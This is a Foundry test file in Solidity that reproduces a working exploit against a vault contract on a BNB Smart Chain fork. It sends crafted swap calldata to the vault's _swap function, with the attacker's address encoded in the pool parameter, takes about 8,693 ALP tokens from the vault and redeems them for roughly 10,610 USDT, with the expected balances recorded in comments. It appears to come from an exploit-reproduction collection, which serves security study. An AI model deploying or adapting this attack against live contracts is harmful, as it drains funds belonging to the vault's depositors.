// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWBNB.sol";
import "@interface/IPancakeV2.sol";

import "./IApolloXBscVault.sol";
import "./IStableCoinVault.sol";

IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IApolloXBscVault constant ALP_APO = IApolloXBscVault(
    0x9Ad45D46e2A2ca19BBB5D5a50Df319225aD60e0d
);
IStableCoinVault constant StableCoinVault = IStableCoinVault(
    payable(0xD188492217F09D18f2B0ecE3F8948015981e961a)
);

contract AlpTest is Test {
    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function setUp() external {
        vm.createSelectFork("bsc", 36727073);
        deal(address(USDT), address(this), 0);
    }

    function testExploit() external {
        ALP_APO.approve(address(ALP_APO), type(uint256).max);

        print("[End] USDT before", USDT.balanceOf(address(this)), 18);
        uint256 StableCoinVaultBalance = ALP_APO.balanceOf(
            address(StableCoinVault)
        );
        // print("StableCoinVaultBalance", VUN_balance, 18);
        // StableCoinVaultBalance: 8693.190985141166818414

        uint256[] memory pools = new uint256[](1);
        pools[0] = uint256(
            1457847883966391224294152661087436089985854139374837306518
        ); // translate into hex,contain your address
        StableCoinVault._swap(
            address(ALP_APO),
            abi.encodeWithSignature(
                "unoswapTo(address,address,uint256,uint256,uint256[])",
                address(this),
                address(ALP_APO),
                StableCoinVaultBalance,
                0,
                pools
            )
        );

        uint256 ALP_APO_Balance = ALP_APO.balanceOf(address(this));
        // print("ALP_APO_Balance", ALP_APO_Balance, 18);
        // ALP_APO_Balance 8693.190985141166818414

        RedeemData memory redeemData;
        redeemData.amount = ALP_APO_Balance;
        redeemData.receiver = address(this);
        redeemData.apolloXRedeemData.alpTokenOut = address(USDT);
        redeemData.apolloXRedeemData.minOut = 0;
        redeemData.apolloXRedeemData.tokenOut = address(USDT);
        redeemData.apolloXRedeemData.aggregatorData = "";
        ALP_APO.redeem(ALP_APO_Balance, redeemData);

        print("[End] USDT balance after", USDT.balanceOf(address(this)), 18);
        // [End] USDT balance after: 10610.966044133177625191
    }
}
